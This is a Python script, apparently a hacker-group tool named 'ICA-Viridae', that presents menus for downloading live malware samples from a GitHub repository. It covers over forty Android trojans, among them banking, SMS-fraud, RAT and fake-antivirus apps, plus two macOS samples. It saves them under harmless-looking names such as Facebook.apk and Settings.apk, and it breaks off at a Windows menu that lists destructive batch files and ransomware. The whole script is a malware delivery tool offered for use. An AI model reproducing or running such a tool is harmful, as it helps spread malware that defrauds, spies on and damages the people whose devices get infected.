#!/usr/bin/python
# -*- coding: utf-8 -*-
#####DONT CHANGE THIS########
import sys,os,platform
from time import *
x = platform.system()
import requests
from tqdm import tqdm
	#--- Color  ---#
W  = '\033[0m'  # white (default)
R  = '\033[1;91m' # red
G  = '\033[1;92m' # green bold
O  = '\033[1;93m' # orange
B  = '\033[1;94m' # blue
P  = '\033[1;95m' # purple
C  = '\033[1;96m' # cyan
GR = '\033[1;97m' # gray
fun = "Successfully Created :-)"

now = strftime("%T")
bulan = strftime("%B")
tahun = strftime("%Y")

#####DANGER!!VIRUS DETECTED!
os.system("clear")
print  """ \033[48;5;0;38;5;160m

	                  uuuuuuuuu
	               uu$$$$$$$$$$$uu
	            uu$$$$$$$$$$$$$$$$$uu
	           u$$$$$$$$$$$$$$$$$$$$$u
	          u$$$$$$$$$$$$$$$$$$$$$$$u
	         u$$$$$$$$$$$$$$$$$$$$$$$$$u
	         u$$$$$$$$$$$$$$$$$$$$$$$$$u
	         u$$$$$$"   "$$$"   "$$$$$$u
	         "$$$$"      u$u       $$$$"
	          $$$u       u$u       u$$$
	          $$$u      u$$$u      u$$$
	           "$$$$uu$$$   $$$uu$$$$"
	            "$$$$$$$"   "$$$$$$$"
	              u$$$$$$$u$$$$$$$u
	               u$"$"$"$"$"$"$u
	    uuu        $$u$ $ $ $ $u$$       uuu
	   u$$$$        $$$$$u$u$u$$$       u$$$$
	    $$$$$uu      "$$$$$$$$$"     uu$$$$$$
	  u$$$$$$$$$$$uu    "'"'"    uuuu$$$$$$$$$$
	  $$$$"'"$$$$$$$$$$uuu   uu$$$$$$$$$"'"$$$"
	   "'"      ""$$$$$$$$$$$uu ""$"'"
	             uuuu ""$$$$$$$$$$uuu
	    u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
	    $$$$$$$$$$"''"           ""$$$$$$$$$$$"
	     "$$$$$"                      ""$$$$""
	       $$$"                         $$$$"

\033[0m"""
os.system("sleep 3")
#--- Def menu ---#
def banner():
    os.system('printf "\033[1;95m*************?\033[0m|\033[1;92mITALIA \033[1;97mCYBER \033[1;91mARMY\033[1;93m-Homeland-Security|\033[1;95m?*************\033[0m\n\033[1;96m*\t\033[1;94m      Think of it as a Beginner   \t\t\t*\n*\t\033[1;91m   Then This World Will be Open For You     \t\t*\n*\033[1;96m         Learn  Security |Learn  Programming| Use  Linux    \t*\n*\033[1;95m   Debugging Program | Write a Code| Share to Your Community   *\n*\t\033[1;92mI am Great Because I Study, I Know Because I Read\t*\n*\t\033[1;94m     I am Proficient Because of Practice (Try & Err0r) \t*\n*\t\t\033[1;97mTrust me, Knowledge Is King \t\t\t*\n\t\t\033[1;93m[© Copyright \033[1;92mITALIA \033[1;97mCYBER \033[1;91mARMY \033[1;96m2020]\n\033[1;95m   ***********************************************************" \n\n')
    os.system('printf "\t\t \033[1;94m [•••••|||\033[1;92m ICA-Viridae \033[1;94m |||•••••]" \n\n ')
    print("")
    print("")

def about():
	print("\t\t"+B+"<<<<<<| "+P+"About Tool "+B+"|>>>>>>\n")
	print("")
	print("")
	print("\t"+G+"Made"+C+" With Full"+R+" <3"+B+"\t\t")
	print("")
	print("\t"+P+"Author  "+G+": "+W+"R00t "+O+"and "+G+"★ ERR0R ★\t\t\t")
	print("")
	print("\t"+P+"Version "+G+": "+C+"3.0\t\t\t")
	print("")
	print("\t"+P+"Team    "+G+": "+G+"ITALIA"+W+" CYBER"+R+" ARMY - "+P+"INDO Cyber Team")
	print("")
	print("\t"+O+"Thanks to "+P+"Iqbalh")
	print("")
	menu()
	
def banner2():
	print(""+O+"")
	
def fontcolor():
	print(""+W+"")
#######DONT CHANGE THIS#########

#################### START ANDROID
def Vandroid():
	print("\n"+R+"[================="+G+"|•|"+GR+"★ERR0R★ Virus"+G+"|•|"+R+" ==================]")
	print("")
	print(""+O+"["+GR+"01"+O+"] "+B+"Agent\t\t"+O+"["+GR+"15"+O+"] Elite\t\t["+GR+"29"+O+"] "+B+"Prasesfee")
	print(""+O+"["+GR+"02"+O+"] Badnews\t\t["+GR+"16"+O+"] "+B+"Omigo"+O+"\t\t["+GR+"30"+O+"] RecipeSmart")
	print(""+O+"["+GR+"03"+O+"] "+B+"Bios"+O+"\t\t["+GR+"17"+O+"] Opfake\t\t["+GR+"31"+O+"] "+B+"Romaticpos")
	print(""+O+"["+GR+"04"+O+"] BlatanSMS\t\t["+GR+"18"+O+"] "+B+"SmsWorker"+O+"\t\t["+GR+"32"+O+"] Statetss")
	print(""+O+"["+GR+"05"+O+"] "+B+"BrainTest"+O+"\t\t["+GR+"19"+O+"] Vietcon\t\t["+GR+"33"+O+"] "+B+"Thinking")
	print(""+O+"["+GR+"06"+O+"] Claco\t\t["+GR+"20"+O+"] "+B+"Candycorn"+O+"\t\t["+GR+"34"+O+"] Crd")
	print(""+O+"["+GR+"07"+O+"] "+B+"DropDialer"+O+"\t\t["+GR+"21"+O+"] Cat\t\t["+GR+"35"+O+"] "+B+"Dendroid")
	print(""+O+"["+GR+"08"+O+"] FakeBank\t\t["+GR+"22"+O+"] "+B+"Chistescortos"+O+"\t["+GR+"36"+O+"] Ds")
	print(""+O+"["+GR+"09"+O+"] "+B+"FakeCMCC"+O+"\t\t["+GR+"23"+O+"] Chistespicanticos\t["+GR+"37"+O+"] "+B+"Facebook")
	print(""+O+"["+GR+"10"+O+"] FakeDoc\t\t["+GR+"24"+O+"] "+B+"ComFunnys"+O+"\t\t["+GR+"38"+O+"] Fakeav")
	print(""+O+"["+GR+"11"+O+"] "+B+"FakeValidation"+O+"\t["+GR+"25"+O+"] ComImagePets\t["+GR+"39"+O+"] "+B+"ArtStation")
	print(""+O+"["+GR+"12"+O+"] Fobus\t\t["+GR+"26"+O+"] "+B+"ComKitchen"+O+"\t\t["+GR+"40"+O+"] MusicPlayer")
	print(""+O+"["+GR+"13"+O+"] "+B+"GinMaster"+O+"\t\t["+GR+"27"+O+"] ComLaughtter\t["+GR+"41"+O+"] "+B+"Settings")
	print(""+O+"["+GR+"14"+O+"] Masnu\t\t["+GR+"28"+O+"] "+B+"Prasesamor"+O+"\t\t["+GR+"42"+O+"] Back")
	print("")
	print(""+R+"[============"+G+"|•|"+GR+"Contact: #"+G+"ITALIA"+GR+"CYBER"+R+" ARMY|•|"+R+"===========]")
	print("")
	try:
		menu1 = input(""+G+"root@viridae ->> "+B+"")
		if menu1 == 1:#############done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Agent.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Agent.apk?raw=true' Android/Agent.apk")
			print(fun)######done
			
		elif menu1 == 2:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/BadNews.A.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'BadNews.A.apk?raw=true' Android/BadNews.apk")
			print(fun)#######done
		
		elif menu1 == 3:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Bios.NativeMaliciousCode.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Bios.NativeMaliciousCode.apk?raw=true' Android/Bios.apk")
			print(fun)#####done
			
		elif menu1 == 4:########done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Blatantsms.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Blatantsms.apk?raw=true' Android/Blatantsms.apk")
			print(fun)#####done
			
		elif menu1 == 5:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/BrainTest.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'BrainTest.apk?raw=true' Android/BrainTest.apk")
			print(fun)#####done
			
		elif menu1 == 6:##########done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Claco.A.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Claco.A.apk?raw=true' Android/Claco.apk")
			print(fun)#####done
			
		elif menu1 == 7:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Dropdialer.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Dropdialer.apk?raw=true' Android/DropDialer.apk")
			print(fun)#####done
			
		elif menu1 == 8:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeBank.B.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeBank.B.apk?raw=true' Android/FakeBank.apk")
			print(fun)#####done
			
		elif menu1 == 9:######done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeCMCC.A.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeCMCC.A.apk?raw=true' Android/FakeCMCC.apk")
			print(fun)#####done
		
		elif menu1 == 10:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeDoc.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeDoc.apk?raw=true' Android/FakeDoc.apk")
			print(fun)#####done
			
		elif menu1 == 11:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeValidation.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeValidation.apk?raw=true' Android/FakeValidation.apk")
			print(fun)#####done
			
		elif menu1 == 12:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Fobus.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Fobus.apk?raw=true' Android/Fobus.apk")
			print(fun)#####done
			
		elif menu1 == 13:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/GinMaster.Z.AdvancedObfuscation.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'GinMaster.Z.AdvancedObfuscation.apk?raw=true' Android/GinMaster.apk")
			print(fun)#####done
			
		elif menu1 == 14:###done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Masnu.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Masnu.apk?raw=true' Android/Masnu.apk")
			print(fun)#####done
			
		elif menu1 == 15:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Minecraft2.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Minecraft2.apk?raw=true' Android/Elite.apk")
			print(fun)#####done
			
		elif menu1 == 16:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Omigo.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Omigo.apk?raw=true' Android/Omigo.apk")
			print(fun)#####done
			
		elif menu1 == 17:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Opfake.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Opfake.apk?raw=true' Android/Opfake.apk")
			print(fun)#####done
			
		elif menu1 == 18:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/SmsWorker.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'SmsWorker.apk?raw=true' Android/SmsWorker.apk")
			print(fun)#####done
			
		elif menu1 == 19:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Vietcon.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Vietcon.apk?raw=true' Android/Vietcon.apk")
			print(fun)#####done
			
		elif menu1 == 20:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/candy_corn.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'candy_corn.apk?raw=true' Android/Candycorn.apk")
			print(fun)#####done
			
		elif menu1 == 21:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/cat.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'cat.apk?raw=true' Android/Cat.apk")
			print(fun)#####done
			
		elif menu1 == 22:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/chistescortos.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'chistescortos.apk?raw=true' Android/Chistescortos.apk")
			print(fun)#####done
			
		elif menu1 == 23:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/chistespicanticos.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'chistespicanticos.apk?raw=true' Android/Chistespicanticos.apk")
			print(fun)#####done
			
		elif menu1 == 24:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.funnyys.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.funnyys.apk?raw=true' Android/ComFunnys.apk")
			print(fun)#####done
			
		elif menu1 == 25:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.imagepets.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.imagepets.apk?raw=true' Android/ComImagePets.apk")
			print(fun)#####done
			
		elif menu1 == 26:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.kitchenn.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.kitchenn.apk?raw=true' Android/ComKitchen.apk")
			print(fun)#####done
			
		elif menu1 == 27:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.laughtter.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.laughtter.apk?raw=true' Android/ComLaughtter.apk")
			print(fun)#####done
			
		elif menu1 == 28:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.prasesamor.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.prasesamor.apk?raw=true' Android/Prasesamor.apk")
			print(fun)#####done
			
		elif menu1 == 29:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.prasesfee.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.prasesfee.apk?raw=true' Android/Prasesfee.apk")
			print(fun)#####done
			
		elif menu1 == 30:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.recipesmart.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.recipesmart.apk?raw=true' Android/Recipesmart.apk")
			print(fun)#####done
			
		elif menu1 == 31:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.romaticpos.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.romaticpos.apk?raw=true' Android/Romaticpos.apk")
			print(fun)#####done
			
		elif menu1 == 32:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.statetss.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.statetss.apk?raw=true' Android/Statetss.apk")
			print(fun)#####done
			
		elif menu1 == 33:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/com.thinkking.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'com.thinkking.apk?raw=true' Android/Thinkking.apk")
			print(fun)#####done
			
		elif menu1 == 34:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/crd.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'crd.apk?raw=true' Android/Crd.apk")
			print(fun)#####done
			
		elif menu1 == 35:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/dendroid.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'dendroid.apk?raw=true' Android/Dendroid.apk")
			print(fun)#####done
			
		elif menu1 == 36:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ds.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'ds.apk?raw=true' Android/Ds.apk")
			print(fun)#####done
			
		elif menu1 == 37:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/facebook.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'facebook.apk?raw=true' Android/Facebook.apk")
			print(fun)#####done
			
		elif menu1 == 38:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Fake_av.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Fake_av.apk?raw=true' Android/Fakeav.apk")
			print(fun)#####done
			
		elif menu1 == 39:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/ArtStation.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'ArtStation.apk?raw=true' Android/ArtStation.apk")
			print(fun)#####done
			
		elif menu1 == 40:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Adware.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Adware.apk?raw=true' Android/MusicPlayerAdware.apk")
			print(fun)#####done
			
		elif menu1 == 41:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Settings.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Settings.apk?raw=true' Android/Settings.apk")
			print(fun)#####done		
			
		elif menu1 == 42:####done
			print("\n")
			menu()
		else:
			print(""+R+"[!] Wrong Number")
	except Exception:
		print(""+R+"[!] This is NOT a Number")
#################ANDROID DONE

#################Start Macosx
def Vmacosx():
	print("\n"+R+"[================="+G+"|•|"+GR+"★ERR0R★ Virus"+G+"|•|"+R+" ==================]")
	print("")
	print(""+O+"["+GR+"01"+O+"]"+B+" Trinoids")
	print(""+O+"["+GR+"02"+O+"] Nothing")
	print(""+O+"["+GR+"03"+O+"] "+B+"Back")
	print("")
	print(""+R+"[==========="+G+"|•|"+GR+"Contact: #"+G+"ITALIA"+GR+"CYBER"+R+"ARMY|•|"+C+"===========]")
	print("")
	try:
		menu2 = input(""+G+"root@viridae ->> "+B+"")
		if menu2 == 1:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/trinoids.app?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'trinoids.app?raw=true' Macosx/Trinoids.app")
			print(fun)#####done
		
		elif menu2 == 2:
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/nothing.app?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'nothing.app?raw=true' Macosx/Nothing.app")
			print(fun)#####done
		elif menu2 == 3:
			print("\n")
			menu()
		else:
			print(""+R+"[!] Wrong Number")
	except Exception:
		print(""+R+"[!] This is NOT a Number")
####################Done Macosx	

###################Start PC
def vpcwin():
	print("\n"+R+"[================="+G+"|•|"+GR+"★ERR0R★ Virus"+G+"|•|"+R+" ==================]")
	print("")
	print(""+O+"["+GR+"01"+O+"] "+B+"Ugly.bat"+O+"\t\t["+GR+"5"+O+"] Koce.bat\t["+GR+"9"+O+"] "+B+"Ransomeware")
	print(""+O+"["+GR+"02"+O+"] Sleepy.bat\t\t["+GR+"6"+O+"] "+B+"Cmd.bat"+O+"\t["+GR+"10"+O+"] Rip.bat")
	print(""+O+"["+GR+"03"+O+"] "+B+"Reg-eater.bat"+O+"\t["+GR+"7"+O+"] Capslock.vbs["+GR+"11"+O+"] "+B+"Back")
	print(""+O+"["+GR+"04"+O+"] Quiz.bat\t\t["+GR+"8"+O+"] "+B+"Alay.vbs")
	print("")
	print(""+R+"[==========="+G+"|•|"+GR+"Contact: #"+G+"ITALIA"+GR+"CYBER"+R+"ARMY|•|"+R+"===========]")
	print("")

	try:	
